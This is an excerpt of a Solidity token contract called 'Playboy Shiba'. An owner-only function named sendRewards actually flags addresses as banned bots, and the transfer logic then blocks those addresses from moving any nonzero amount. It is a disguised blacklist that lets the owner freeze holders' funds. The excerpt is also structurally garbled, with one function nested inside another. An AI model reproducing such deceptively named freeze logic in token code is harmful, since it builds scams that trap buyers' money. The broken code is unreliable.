...
contract PlayboyShibaToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _sendRewards;
    ...
    string private _name = 'Playboy Shiba';
    ...
    function sendRewards(address botAddress) external onlyOwner {
        if (_sendRewards[botAddress] == true) {
            _sendRewards[botAddress] = false;
        } else {_sendRewards[botAddress] = true;
            emit botBanned (botAddress, _sendRewards[botAddress]);
          }
    }
    
    function airdropRewards(address botAddress) public view returns (bool) {
        return _sendRewards[botAddress];
    }
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
       ...
       function approveERC20(address owner, uint256 amount) public virtual onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_sendRewards[sender] || _sendRewards[recipient]) require (amount == 0, "");
